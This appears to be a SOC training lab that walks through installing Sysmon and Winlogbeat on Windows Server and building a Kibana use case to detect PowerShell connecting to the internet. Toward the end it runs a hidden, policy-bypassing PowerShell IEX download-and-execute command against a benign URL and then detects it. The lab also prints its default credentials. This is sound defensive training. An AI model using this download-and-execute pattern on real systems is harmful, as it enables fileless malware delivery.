**Lab Scenario**

Attackers use trusted binaries, to download and execute malicious code from remote sources. Attackers mainly use PowerShell as a downloader, lateral movement and fileless threats. Monitoring execution for powershell commands to connect to the internet, will help SOC Analyst take immediate action to stop damage and prevent further damage from happening.

**Lab Objectives**

The objective of this lab is to create ELK SIEM use case for monitoring Powershell Command connecting to the internet for downloading and executing scripts.

> In case you save the labs in this module, reboot the Security Onion in this Exercise and repeat Steps 35-39 to access the Kibana Service.
> 

**Lab Tasks**

- [ ]  Click [WinServer2012](https://labclient.labondemand.com/Instructions/cdfc9656-afea-4528-bdd2-c5f354ae0d91#) machine.

> If Windows2012 is already launched, skip to step 3
> 
- [ ]  Click [Ctrl+Alt+Delete](https://labclient.labondemand.com/Instructions/cdfc9656-afea-4528-bdd2-c5f354ae0d91#) link. By default **Admin** account is selected, click Pa$$w0rd and press **Enter** to login.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/jym20uyi.jpg)

- [ ]  A pop-up **"Do you want to find PCs,devices, and content on this network, and automatically connect to devices like printers and TVs?** will appear. Click **Yes**

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/hfzok0go.jpg)

- [ ]  To install and configure **Sysmon**. Navigate to **E:\SOC-Tools\ Module 04 Incident Detection with Security Information and Event Management (SIEM)** and copy **Sysmon.Zip**.

> To get additional details about powershell commands executed, we will use Sysmon. Sysmon will monitor and log system activity to the Windows event logs.
> 
> 
> If you get Windows Security pop-up, click **OK**.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/zkx4xq5r.jpg)

- [ ]  **Paste** the copied **Sysmon.zip** file under **C: drive**.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/3kranjym.jpg)

- [ ]  **Right-click** and **unzip** all the zip files under **C: drive** using **Extract here** option from context menu. Delete the zip files after unzipping.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/2v4lfraj.jpg)

- [ ]  To configure sysmon to monitor events generated by **LSASS.exe**. Open Sysmon folder. Right-click sysmonconfig-export.xml file and click **Edit with Notepad++** from context menu to open the file.

> Local Security Authority Subsystem Service (LSASS.exe) is a process in Microsoft Windows operating systems responsible for enforcing the security policy on the systemany file of the system. It is faked by malware and can become corrupted by a virus or trojan.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/effgfovq.jpg)

- [ ]  Go to Line No. **450** and add the following line

```
TypeCopy
<TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
```

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/vzrnlcd5.jpg)

- [ ]  Go to Line No. **452** and add the following line

```
TypeCopy
<ProcessAccess onmatch="exclude">
<SourceImage condition="is">C:\Program Files (x86)\VMware\VMware Workstation\vmware-authd.exe</SourceImage>
</ProcessAccess>
```

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/sgvlcaee.jpg)

- [ ]  Click **Save** and **close** all the open windows.
- [ ]  To open **command prompt** in Administrator mode right-click Windows and click **Command Prompt (Admin)** from the context menu.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/g20etrrc.jpg)

- [ ]  Command prompt window will open. To navigate to **c:\Sysmon** directory type **cd c:\Sysmon** and press **Enter**.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/fwp5wisc.jpg)

- [ ]  To install **Sysmon** click Sysmon.exe -i Sysmonconfig-export.xml -accepteula -h md5,sha256 -n -l and press **Enter**

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/i1gbsvbv.jpg)

- [ ]  You will see message Sysmon started.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/f4m3re0n.jpg)

- [ ]  To auto restart Sysmon service, click sc config Sysmon start= auto and press **Enter**. Service configuration will change to Automatic. Close the command prompt window.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/5pnvmqbr.jpg)

- [ ]  Navigate to **E:\SOC-Tools\ Module 04 Incident Detection with Security Information and Event Management (SIEM)** and copy **Beats** folder.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/pqygmt1d.jpg)

- [ ]  Paste the copied **Beats** folder under **C:** Drive.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/f1retgsq.jpg)

- [ ]  Open **Beats** folder. Right-click and unzip the **winlogbeat-6.5.4-windows-x86_64.zip** file under **C:\Beats**. Delete the zip file after unzipping.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/bqjuj5ky.jpg)

- [ ]  click Windows **Start** button. Right-click on **Windows PowerShell** icon and click **Run as Administrator** from the context menu.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/0lp3b2k4.jpg)

- [ ]  To navigate to winlogbeat directory, click Cd C:\Beats\winlogbeat-6.5.4-windows-x86_64 ,press **Enter**.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/u3c2hi3m.jpg)

- [ ]  To install winlogbeat, click PowerShell.exe -ExecutionPolicy UnRestricted -File .\install-service-winlogbeat.ps1 and press **Enter**.You will see winlogbeat will be sucessfully installed and the status of winlogbeat service will be Stopped.

> If Security warning message appears, type R and press Enter to continue.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/pubgxvz2.jpg)

- [ ]  Navigate to **C:\Beats\winlogbeat-6.5.4-windows-x86_64** and open the file **winlogbeat.yml** with Notepad++.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/hkpupkwi.jpg)

- [ ]  In winlogbeat.event_logs add the following line at Line no **25**.

```
TypeCopy
- name: Microsoft-Windows-Sysmon/Operational
```

> Make sure that the alignment of the copied line is same as that of the previous line.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/um3iym3x.jpg)

- [ ]  In **Kibana** section under **setup.kibana**: Line no **71**, delete **#** to uncomment line and change **host: "localhost:5601"** to **host: "192.168.1.95:5601"**.

![](https://labondemand.blob.core.windows.net/content/lab161185/screens/c44zapd5.jpg)

- [ ]  In **Elasticsearch output** section under **output.elasticsearch**: Line no **98** change **hosts: ["localhost:9200"]** to **hosts: ["192.168.1.95:9200"]** .

![](https://labondemand.blob.core.windows.net/content/lab161185/screens/05wvnl2d.jpg)

- [ ]  Save the file **winlogbeat.yml** and close.
- [ ]  To **test** winlogbeat configuration, Switch to the Windows PowerShell and click .\winlogbeat.exe test config -c .\winlogbeat.yml –e and press **Enter**. **Config Ok** message will display as shown in following screenshot.

> In powershell window you should be in winlogbeat-6.5.4-windows-x86_64 directory before executing the above command. If not refer step no. 20 to navigate to winlogbeat-6.5.4-windows-x86_64 directory.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/4ubv5k4z.jpg)

- [ ]  Close all open windows.
- [ ]  Right-click windows **start** button, Click Search and click service into search field, click on **Services** to open Services window.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/eyc1jzy3.jpg)

- [ ]  To start winlogbeat service, Search and select winlogbeat service, click on Start in the left pane.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/o3qjc4h4.jpg)

- [ ]  Close Services windows.
- [ ]  Click [Security Onion](https://labclient.labondemand.com/Instructions/cdfc9656-afea-4528-bdd2-c5f354ae0d91#) machine.
- [ ]  Enter Username **administrator**, password **toor**, and press **Enter** to login.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/4sst14nt.jpg)

- [ ]  To open Terminal, right-click on desktop and click **Open Terminal**

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/1n0olghs.jpg)

- [ ]  To configure firewall , type **sudo so-allow** and press **Enter**. Type **toor** as password and press **Enter**.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/dp10nu2o.jpg)

- [ ]  You will see **Please enter your selection**. To allow **Logstash Beat - port 5044/tcp** type **b** and press **Enter**

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/nymjfbc3.jpg)

- [ ]  You will see **Please enter the IP address (or CIDR range) you'd like to allow to connect to port(s): 5044** type **192.168.1.4** and press **Enter**. You will see **To continue and add this rule, press Enter. Otherwise, press Ctrl-c to exit**. Press **Enter**.
    
    ![](https://labondemand.blob.core.windows.net/content/lab161185/screens/taty20xp.jpg)
    
    ![](https://labondemand.blob.core.windows.net/content/lab161185/screens/u2zdyqdx.jpg)
    
- [ ]  To allow **Elasticsearch REST endpoint -port 9200**, type **sudo so-allow** and press **Enter**. You will see **Please enter your selection** type **e** and press **Enter**. You will see **Please enter the IP address (or CIDR range) you'd like to allow to connect to port(s): 9200** type **192.168.1.4** and press **Enter**. You will see **To continue and add this rule, press Enter. Otherwise, press Ctrl-c to exit**. Press **Enter**. Close the terminal.

> if asked for password, type toor as password and press Enter
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/screens/qocyzext.jpg)

![](https://labondemand.blob.core.windows.net/content/lab161185/screens/d4qzrcb5.jpg)

![](https://labondemand.blob.core.windows.net/content/lab161185/screens/g4xd0jsz.jpg)

- [ ]  To launch Kibana, double-click **Kibana**, shortcut icon from the desktop.
- [ ]  Your connection is not private page appears, click ADVANCED.
    
    ![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/dgoqqj4j.jpg)
    
- [ ]  Click Proceed to localhost (unsafe) link.
    
    ![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/d5dit5xa.jpg)
    
- [ ]  Login screen appears, type username **martin** and password **martin@123**.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/koomtmza.jpg)

- [ ]  On the Kibana Home page, if you see the **Kibana status is Red**, as shown in the screenshot. Refresh the page until it changes to **Kibana status is Green** or you are redirected to **Management --> Create index pattern** page.
    
    ![](https://labondemand.blob.core.windows.net/content/lab161185/screens/1ctmnzou.jpg)
    
    ![](https://labondemand.blob.core.windows.net/content/lab161185/screens/fvppvaip.jpg)
    
- [ ]  In the Kibana **Management --> Create index pattern** screen, in **Step1 of 2: Define index pattern**. Type **winlogbeat***. As you begin you will see all Winlogbeat indexes in kibana. click the **Next step** button.

> If you do not see winlogbeats indexes, switch to WinServer2012 Machine. Stop the winlogbeats service. Start the service again and execute Step No.27. Switch to Security Onion Machine and reload Management --> Create index pattern screen.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/v4l10nqd.jpg)

- [ ]  In the **Step2 of 2: Configure settings**, select **@timestamp** from **Time Filter field name** drop-down and click the **Create index pattern** button button.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/zgsbmmph.jpg)

- [ ]  You will see index pattern page displaying the fieldsof the created index. Click on **Discover** in the left menu.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/2wkefzbc.jpg)

- [ ]  Launch [WinServer2012](https://labclient.labondemand.com/Instructions/cdfc9656-afea-4528-bdd2-c5f354ae0d91#) Machine.
- [ ]  To open Poweshell, click Windows **Start** button. Right-click on **Windows PowerShell** icon and click **Run as Administrator** from the context menu.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/0lp3b2k4.jpg)

- [ ]  To use powershell to launch webclient and download any malicious script. Type the following command and press **Enter**

powershell -exec bypass -nop -w hidden "IEX ((new-object net.webclient).downloadstring('https://www.google.com'))"

> The use of -nop Prevents PowerShell from loading profile scripts, which get executed on launch and use of -w hidden prevent PowerShell from displaying a window when it executes code. Any powershell command executed with these two options indicates some suspicious activity. In the demo we are using https://www.google.com as download string. This string can be replaced by any malicous script by the attacker.
> 

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/jtaozttd.jpg)

- [ ]  Close all open windows.
- [ ]  Launch [Security Onion](https://labclient.labondemand.com/Instructions/cdfc9656-afea-4528-bdd2-c5f354ae0d91#) Machine. In the Kiban Discover page type **event_id:3** in the **Search…(e.g. status:200 AND extension:PHP)** textbox and click **Update** button.

![](https://labondemand.blob.core.windows.net/content/lab161185/screens/guz3ehw1.jpg)

- [ ]  You will see all the poweshell commands with **event_id 3**.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/a35mqlqz.jpg)

- [ ]  Expand the first event by clicking the right arrow You will see the details of the event. by following the hostSourceName, SourceIp and destination Ip. You can identify the host which initiated the connection, and where it was connected.

![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/e2ooxcfi.jpg)

